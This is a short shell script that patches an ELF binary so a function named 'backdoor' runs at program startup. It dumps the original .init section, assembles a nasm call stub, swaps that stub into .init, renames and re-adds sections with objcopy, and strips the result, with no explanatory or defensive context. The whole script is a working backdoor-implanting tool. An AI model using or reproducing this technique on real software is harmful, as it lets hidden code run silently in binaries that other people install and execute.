#!/bin/sh

set -ex

SRC="$1"
DST="$2"

objcopy --dump-section .init=init.original.bin "${SRC}"
BACKDOOR_ADDR=$(nm ${SRC} | grep '\bbackdoor\b' | awk '{print "0x" x $1}')
INIT_VMA=$(objdump -j .init -h "${SRC}" | awk '/\.init/ { print "0x" x $4 }')
JUMP=$(printf "%#x" $(($BACKDOOR_ADDR-$INIT_VMA)))

cat > init_redirect.asm <<EOF
BITS 64
call \$+$JUMP
ret
EOF

nasm -fbin -oinit.backdoor.bin init_redirect.asm

rm -f "${DST}"
objcopy --update-section .init=init.backdoor.bin \
        --rename-section .init=.xinit \
        --add-section=.init=init.original.bin \
        --set-section-flags .init=alloc,code \
        --change-section-vma .init=$INIT_VMA "${SRC}" "${DST}"

strip -s "${DST}" -o "${DST}.strip"
